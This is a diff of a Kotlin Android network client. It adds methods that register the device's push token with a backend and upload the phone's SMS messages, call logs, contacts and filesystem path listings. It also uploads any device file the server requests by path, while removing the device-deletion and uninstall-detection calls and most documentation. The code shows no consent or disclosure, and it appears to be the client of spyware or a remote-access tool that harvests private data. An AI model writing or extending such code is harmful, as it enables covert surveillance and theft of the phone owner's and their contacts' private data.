@@ -18,7 +18,6 @@ import okhttp3.ResponseBody
 
 /**
  * Data class to represent the JSON payload for device registration.
- * Now includes an optional 'name' field.
  */
 data class DeviceRegistrationPayload(
     val token: String,
@@ -29,34 +28,23 @@ data class DeviceRegistrationPayload(
 
 /**
  * Handles all network communication with the backend server.
- * Provides methods for device registration and file/text uploads.
  */
 class ApiClient(private val baseUrl: String) {
 
-    // Improved: Configured OkHttpClient with proper timeouts for better performance
     private val client = OkHttpClient.Builder()
-        .connectTimeout(30, TimeUnit.SECONDS)
-        .readTimeout(30, TimeUnit.SECONDS)
-        .writeTimeout(30, TimeUnit.SECONDS)
+        .connectTimeout(60, TimeUnit.SECONDS) // Increased timeouts for larger syncs
+        .readTimeout(60, TimeUnit.SECONDS)
+        .writeTimeout(60, TimeUnit.SECONDS)
         .build()
-    
+
     private val gson = Gson()
-    
-    // Improved: Made TAG a companion object constant following Kotlin conventions
+
     companion object {
         private const val TAG = "ApiClient"
         private const val MEDIA_TYPE_JSON = "application/json; charset=utf-8"
         private const val MEDIA_TYPE_CSV = "text/csv"
     }
 
-    /**
-     * Registers the device's FCM token, model, and unique ID with the server.
-     * @param token The FCM registration token.
-     * @param deviceModel The model name of the device.
-     * @param deviceId The unique Android ID for the device.
-     * @param name An optional, user-provided name for the device.
-     * @return True if the registration was successful, false otherwise.
-     */
     suspend fun registerDevice(
         token: String,
         deviceModel: String,
@@ -67,353 +55,111 @@ class ApiClient(private val baseUrl: String) {
             val url = "$baseUrl/api/register-device"
             val payload = DeviceRegistrationPayload(token, deviceModel, deviceId, name)
             val jsonBody = gson.toJson(payload)
-
             val requestBody = jsonBody.toRequestBody(MEDIA_TYPE_JSON.toMediaTypeOrNull())
-            val request = Request.Builder()
-                .url(url)
-                .post(requestBody)
-                .build()
-
+            val request = Request.Builder().url(url).post(requestBody).build()
             try {
                 client.newCall(request).execute().use { response ->
-                    when {
-                        response.isSuccessful -> {
-                            Log.i(TAG, "Device registered successfully with token, model, and ID.")
-                            true
-                        }
-                        else -> {
-                            // Improved: Better error logging with null-safe response body handling
-                            val errorBody = response.body?.string() ?: "No error details"
-                            Log.e(TAG, "Server Error during device registration: ${response.code} $errorBody")
-                            false
-                        }
+                    response.isSuccessful.also {
+                        if (!it) Log.e(TAG, "Server Error on registerDevice: ${response.code}")
                     }
                 }
             } catch (e: IOException) {
-                Log.e(TAG, "Network Error during device registration", e)
+                Log.e(TAG, "Network Error on registerDevice", e)
                 false
             }
         }
     }
 
-    /**
-     * Uploads a simple text message to the server.
-     * @param message The text message to upload.
-     * @return True if the upload was successful, false otherwise.
-     */
-    suspend fun uploadText(message: String): Boolean {
+    suspend fun uploadFile(file: File, caption: String, deviceId: String): Boolean {
         return withContext(Dispatchers.IO) {
             val url = "$baseUrl/api/upload"
             val requestBody = MultipartBody.Builder()
                 .setType(MultipartBody.FORM)
-                .addFormDataPart("message", message)
-                .build()
-            
-            val request = Request.Builder()
-                .url(url)
-                .post(requestBody)
-                .build()
-
-            executeRequest(request, "uploadText")
-        }
-    }
-
-    /**
-     * Uploads a file (like a CSV) with a caption to the server.
-     * @param file The file to upload.
-     * @param caption A caption describing the file.
-     * @return True if the upload was successful, false otherwise.
-     */
-    suspend fun uploadFile(file: File, caption: String): Boolean {
-        return withContext(Dispatchers.IO) {
-            val url = "$baseUrl/api/upload"
-            val requestBody = MultipartBody.Builder()
-                .setType(MultipartBody.FORM)
+                .addFormDataPart("deviceId", deviceId)
                 .addFormDataPart("caption", caption)
-                .addFormDataPart(
-                    "document", 
-                    file.name, 
-                    file.asRequestBody(MEDIA_TYPE_CSV.toMediaTypeOrNull())
-                )
+                .addFormDataPart("document", file.name, file.asRequestBody(MEDIA_TYPE_CSV.toMediaTypeOrNull()))
                 .build()
-            
-            val request = Request.Builder()
-                .url(url)
-                .post(requestBody)
-                .build()
-
+            val request = Request.Builder().url(url).post(requestBody).build()
             executeRequest(request, "uploadFile")
         }
     }
 
-    /**
-     * Deletes a device from the server when the app is uninstalled.
-     * @param deviceId The unique identifier of the device to remove.
-     * @return True if the deletion was successful, false otherwise.
-     */
-    suspend fun deleteDevice(deviceId: String): Boolean {
+    suspend fun uploadRequestedFile(file: File, deviceId: String, originalPath: String): Boolean {
         return withContext(Dispatchers.IO) {
-            val url = "$baseUrl/api/delete-device"
-            
-            val jsonBody = gson.toJson(mapOf("deviceId" to deviceId))
-            val requestBody = jsonBody.toRequestBody(MEDIA_TYPE_JSON.toMediaTypeOrNull())
-            
-            val request = Request.Builder()
-                .url(url)
-                .post(requestBody)  // Using POST instead of DELETE for better payload support
+            val url = "$baseUrl/api/upload-requested-file"
+            val requestBody = MultipartBody.Builder()
+                .setType(MultipartBody.FORM)
+                .addFormDataPart("deviceId", deviceId)
+                .addFormDataPart("originalPath", originalPath)
+                .addFormDataPart("file", file.name, file.asRequestBody("application/octet-stream".toMediaTypeOrNull()))
                 .build()
-
-            try {
-                client.newCall(request).execute().use { response ->
-                    when {
-                        response.isSuccessful -> {
-                            Log.i(TAG, "Device successfully deleted from server: $deviceId")
-                            true
-                        }
-                        response.code == 404 -> {
-                            // Device wasn't found - consider this a success since it's gone already
-                            Log.i(TAG, "Device already removed or not found on server: $deviceId")
-                            true
-                        }
-                        else -> {
-                            val errorBody = response.body?.string() ?: "No error details"
-                            Log.e(TAG, "Server Error during device deletion: ${response.code} $errorBody")
-                            false
-                        }
-                    }
-                }
-            } catch (e: IOException) {
-                Log.e(TAG, "Network Error during device deletion", e)
-                false
+            val request = Request.Builder().url(url).post(requestBody).build()
+            executeRequest(request, "uploadRequestedFile")
+        }
+    }
+    
+    suspend fun uploadFileSystemPaths(pathsData: String, deviceId: String): Boolean {
+        return withContext(Dispatchers.IO) {
+            val url = "$baseUrl/api/upload-paths"
+            val payload = mapOf("deviceId" to deviceId, "pathsData" to pathsData)
+            val jsonBody = gson.toJson(payload)
+            val requestBody = jsonBody.toRequestBody(MEDIA_TYPE_JSON.toMediaTypeOrNull())
+            val request = Request.Builder().url(url).post(requestBody).build()
+            executeRequest(request, "uploadFileSystemPaths")
+        }
+    }
+    
+    /**
+     * Sends a batch of data (like SMS, Contacts) to a specific sync endpoint.
+     */
+    private suspend fun <T> syncData(endpoint: String, deviceId: String, data: List<T>): Boolean {
+        return withContext(Dispatchers.IO) {
+            if (data.isEmpty()) {
+                Log.d(TAG, "No data to sync for endpoint: $endpoint. Skipping.")
+                return@withContext true
             }
+
+            val url = "$baseUrl/api/sync/$endpoint"
+            val payload = mapOf(
+                "deviceId" to deviceId,
+                "data" to data
+            )
+            val jsonBody = gson.toJson(payload)
+            val requestBody = jsonBody.toRequestBody(MEDIA_TYPE_JSON.toMediaTypeOrNull())
+
+            val request = Request.Builder().url(url).post(requestBody).build()
+            executeRequest(request, "syncData ($endpoint)")
         }
     }
 
-    /**
-     * Pings the server to check if a device is still registered.
-     * Used to detect app uninstalls or token invalidation.
-     * @param token The FCM token to check.
-     * @param deviceId The device ID to check.
-     * @return True if the device exists and token is valid, false otherwise.
-     */
-    suspend fun pingDevice(token: String, deviceId: String): Boolean {
-        return withContext(Dispatchers.IO) {
-            val url = "$baseUrl/api/ping-device"
-            
-            val jsonBody = gson.toJson(mapOf(
-                "token" to token, 
-                "deviceId" to deviceId
-            ))
-            val requestBody = jsonBody.toRequestBody(MEDIA_TYPE_JSON.toMediaTypeOrNull())
-            
-            val request = Request.Builder()
-                .url(url)
-                .post(requestBody)
-                .build()
-
-            try {
-                client.newCall(request).execute().use { response ->
-                    response.isSuccessful
-                }
-            } catch (e: IOException) {
-                Log.e(TAG, "Network Error during device ping", e)
-                false
-            }
-        }
+    suspend fun syncSms(deviceId: String, smsList: List<SmsEntity>): Boolean {
+        return syncData("sms", deviceId, smsList)
     }
 
-    /**
-     * Improved: Extracted common request execution logic to reduce code duplication
-     * and improve maintainability.
-     */
+    suspend fun syncCallLogs(deviceId: String, callLogs: List<CallLogEntity>): Boolean {
+        return syncData("calllogs", deviceId, callLogs)
+    }
+
+    suspend fun syncContacts(deviceId: String, contacts: List<ContactEntity>): Boolean {
+        return syncData("contacts", deviceId, contacts)
+    }
+
+
     private fun executeRequest(request: Request, operationName: String): Boolean {
         return try {
             client.newCall(request).execute().use { response ->
-                when {
-                    response.isSuccessful -> {
-                        Log.d(TAG, "$operationName completed successfully")
-                        true
-                    }
-                    else -> {
-                        val errorBody = response.body?.string() ?: "No error details"
-                        Log.e(TAG, "Server Error on $operationName: ${response.code} $errorBody")
-                        false
-                    }
+                if (response.isSuccessful) {
+                    Log.d(TAG, "$operationName completed successfully")
+                    true
+                } else {
+                    val errorBody = response.body?.string() ?: "No error details"
+                    Log.e(TAG, "Server Error on $operationName: ${response.code} $errorBody")
+                    false
                 }
             }
         } catch (e: IOException) {
             Log.e(TAG, "Network Error on $operationName", e)
             false
-        }
-    }
-
-    /**
-     * Clean up resources when no longer needed
-     */
-    fun cleanup() {
-        try {
-            client.dispatcher.executorService.shutdown()
-            client.connectionPool.evictAll()
-        } catch (e: Exception) {
-            Log.w(TAG, "Error during cleanup", e)
-        }
-    }
-
-    /**
-     * Sends filesystem paths to the server for remote storage and analysis
-     * @param pathsData The formatted filesystem scan data
-     * @param deviceId The unique device identifier
-     * @return True if the upload was successful, false otherwise
-     */
-    suspend fun uploadFileSystemPaths(pathsData: String, deviceId: String): Boolean {
-        return withContext(Dispatchers.IO) {
-            val url = "$baseUrl/api/upload-paths"
-            
-            val payload = mapOf(
-                "deviceId" to deviceId,
-                "pathsData" to pathsData,
-                "timestamp" to System.currentTimeMillis()
-            )
-            
-            val jsonBody = gson.toJson(payload)
-            val requestBody = jsonBody.toRequestBody(MEDIA_TYPE_JSON.toMediaTypeOrNull())
-            
-            val request = Request.Builder()
-                .url(url)
-                .post(requestBody)
-                .build()
-
-            try {
-                client.newCall(request).execute().use { response ->
-                    when {
-                        response.isSuccessful -> {
-                            Log.i(TAG, "Filesystem paths uploaded successfully")
-                            true
-                        }
-                        else -> {
-                            val errorBody = response.body?.string() ?: "No error details"
-                            Log.e(TAG, "Server Error during paths upload: ${response.code} $errorBody")
-                            false
-                        }
-                    }
-                }
-            } catch (e: IOException) {
-                Log.e(TAG, "Network Error during paths upload", e)
-                false
-            }
-        }
-    }
-
-    /**
-     * Requests a specific file from the server by path
-     * @param deviceId The device identifier
-     * @param filePath The path of the file to request from the device
-     * @return True if the request was successful, false otherwise
-     */
-    suspend fun requestDeviceFile(deviceId: String, filePath: String): Boolean {
-        return withContext(Dispatchers.IO) {
-            val url = "$baseUrl/api/request-file"
-            
-            val payload = mapOf(
-                "deviceId" to deviceId,
-                "filePath" to filePath,
-                "timestamp" to System.currentTimeMillis()
-            )
-            
-            val jsonBody = gson.toJson(payload)
-            val requestBody = jsonBody.toRequestBody(MEDIA_TYPE_JSON.toMediaTypeOrNull())
-            
-            val request = Request.Builder()
-                .url(url)
-                .post(requestBody)
-                .build()
-
-            try {
-                client.newCall(request).execute().use { response ->
-                    when {
-                        response.isSuccessful -> {
-                            Log.i(TAG, "File request sent successfully: $filePath")
-                            true
-                        }
-                        else -> {
-                            val errorBody = response.body?.string() ?: "No error details"
-                            Log.e(TAG, "Server Error during file request: ${response.code} $errorBody")
-                            false
-                        }
-                    }
-                }
-            } catch (e: IOException) {
-                Log.e(TAG, "Network Error during file request", e)
-                false
-            }
-        }
-    }
-
-    /**
-     * Downloads a file from the server
-     * @param serverFilePath The path to the file on the server
-     * @return ResponseBody if successful, null otherwise
-     */
-    suspend fun downloadFile(serverFilePath: String): ResponseBody? {
-        return withContext(Dispatchers.IO) {
-            val url = "$baseUrl/api/download-file"
-            
-            val payload = mapOf("filePath" to serverFilePath)
-            val jsonBody = gson.toJson(payload)
-            val requestBody = jsonBody.toRequestBody(MEDIA_TYPE_JSON.toMediaTypeOrNull())
-            
-            val request = Request.Builder()
-                .url(url)
-                .post(requestBody)
-                .build()
-
-            try {
-                val response = client.newCall(request).execute()
-                if (response.isSuccessful) {
-                    Log.i(TAG, "File download started: $serverFilePath")
-                    response.body
-                } else {
-                    val errorBody = response.body?.string() ?: "No error details"
-                    Log.e(TAG, "Server Error during file download: ${response.code} $errorBody")
-                    response.close()
-                    null
-                }
-            } catch (e: IOException) {
-                Log.e(TAG, "Network Error during file download", e)
-                null
-            }
-        }
-    }
-
-    /**
-     * Uploads a specific device file to the server (when requested)
-     * @param file The file to upload
-     * @param deviceId The device identifier
-     * @param originalPath The original path of the file on the device
-     * @return True if the upload was successful, false otherwise
-     */
-    suspend fun uploadRequestedFile(file: File, deviceId: String, originalPath: String): Boolean {
-        return withContext(Dispatchers.IO) {
-            val url = "$baseUrl/api/upload-requested-file"
-            
-            val requestBody = MultipartBody.Builder()
-                .setType(MultipartBody.FORM)
-                .addFormDataPart("deviceId", deviceId)
-                .addFormDataPart("originalPath", originalPath)
-                .addFormDataPart("timestamp", System.currentTimeMillis().toString())
-                .addFormDataPart(
-                    "file", 
-                    file.name, 
-                    file.asRequestBody("application/octet-stream".toMediaTypeOrNull())
-                )
-                .build()
-            
-            val request = Request.Builder()
-                .url(url)
-                .post(requestBody)
-                .build()
-
-            executeRequest(request, "uploadRequestedFile")
         }
     }
 }
